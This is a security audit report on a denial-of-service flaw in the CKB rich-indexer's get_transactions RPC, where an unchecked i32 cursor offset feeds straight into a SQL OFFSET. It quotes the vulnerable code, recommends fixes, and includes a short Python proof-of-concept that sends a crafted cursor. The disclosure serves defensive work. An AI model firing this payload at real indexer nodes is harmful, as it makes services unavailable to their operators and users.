Audit Report

## Title
Unvalidated `i32` OFFSET in `get_tx_with_cell` Enables Indexer RPC DoS via Crafted Pagination Cursor — (File: util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs)

## Summary
The `get_transactions` RPC handler for the rich-indexer decodes the `after` pagination cursor's last 4 bytes as an `i32` offset with no upper-bound validation. The decoded value is passed directly as a SQL `OFFSET` clause, allowing any remote caller to force an arbitrarily expensive sequential table scan. The async rich-indexer path has no per-query timeout, unlike the non-async `IndexerHandle` which wraps iterators in a `TimeoutIterator`.

## Finding Description
In `get_transactions.rs` lines 44–53, the `after` cursor is validated only for byte length (exactly 12), then split into an 8-byte `i64` tx_id and a 4-byte `i32` offset with no range check:

```rust
let (last, offset) = after.as_bytes().split_at(after.len() - 4);
let last = decode_i64(last)?;
let offset = decode_i32(offset)?;
last_cursor = Some((last, offset));
```

`decode_i32` in `mod.rs` lines 286–294 performs only a length check:

```rust
fn decode_i32(data: &[u8]) -> Result<i32, Error> {
    if data.len() != 4 { return Err(...) }
    Ok(i32::from_le_bytes(to_fixed_array(&data[0..4])))
}
```

The decoded offset is passed directly to the SQL query builder at `get_transactions.rs` lines 180–182:

```rust
if let Some((_, offset)) = last_cursor {
    query_builder.offset(offset);
}
```

This produces `... LIMIT N OFFSET 2147483647`, which both SQLite and PostgreSQL implement by sequentially scanning and discarding rows up to the offset value. The `request_limit` guard at lines 27–32 caps only the `limit` parameter, not the offset.

`AsyncRichIndexerHandle` in `mod.rs` lines 23–27 carries no `timeout_limit` field and no per-query timeout mechanism. By contrast, `IndexerHandle` in `util/indexer/src/service.rs` lines 167–172 carries `timeout_limit: Duration` and wraps all iterators in `TimeoutIterator` (lines 242, 462, 720). The `async_handle()` method in `util/rich-indexer/src/service.rs` line 97–99 passes only `request_limit` to `AsyncRichIndexerHandle::new`, confirming no timeout is threaded through.

## Impact Explanation
**Note (0–500 points) — Local RPC API crash/unresponsiveness.** A crafted cursor causes the indexer RPC to execute a full sequential table scan with no timeout, rendering the indexer RPC unresponsive for the duration of the query. The core CKB node (consensus, P2P, block validation) continues to function; only the indexer RPC service is affected. The claimed "High — crash a CKB node" severity is not supported by the evidence: the PoC demonstrates query slowness, not a process crash or core node failure. The correct in-scope impact is indexer RPC unavailability.

## Likelihood Explanation
The rich-indexer RPC is unauthenticated and network-accessible by default. The 12-byte cursor format is trivially constructable — 8 zero bytes followed by `[0xff, 0xff, 0xff, 0x7f]` (little-endian `i32::MAX`). No proof-of-work, key material, or privileged access is required. The attack is stateless and repeatable from any network peer.

## Recommendation
Add an upper-bound check on the decoded offset immediately after `decode_i32` in `get_transactions.rs`, rejecting cursors whose offset exceeds a reasonable maximum (e.g., `self.request_limit`):

```rust
if offset < 0 || offset as usize > self.request_limit {
    return Err(Error::Params("cursor offset out of range".to_string()));
}
```

Additionally, add a `timeout_limit` field to `AsyncRichIndexerHandle` and apply a per-query timeout via `tokio::time::timeout`, analogous to the `TimeoutIterator` already used in `util/indexer/src/service.rs`.

## Proof of Concept
Craft the `after` cursor as 12 bytes: 8 zero bytes (tx_id = 0) followed by `[0xff, 0xff, 0xff, 0x7f]` (little-endian `i32::MAX`):

```python
import json, requests, time

after_cursor = "0x" + "00" * 8 + "ffffff7f"

payload = {
    "jsonrpc": "2.0", "id": 1,
    "method": "get_transactions",
    "params": [
        {
            "script": {
                "code_hash": "0x9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723bbda3cce8",
                "hash_type": "type",
                "args": "0x"
            },
            "script_type": "lock",
            "group_by_transaction": False
        },
        "asc", "0x1", after_cursor
    ]
}

t0 = time.time()
r = requests.post("http://localhost:8114", json=payload)
print(f"elapsed: {time.time()-t0:.2f}s")
```

Compare elapsed time against a normal cursor (`"0x" + "00"*12`). The crafted cursor produces query time proportional to the full table size; the normal cursor returns immediately.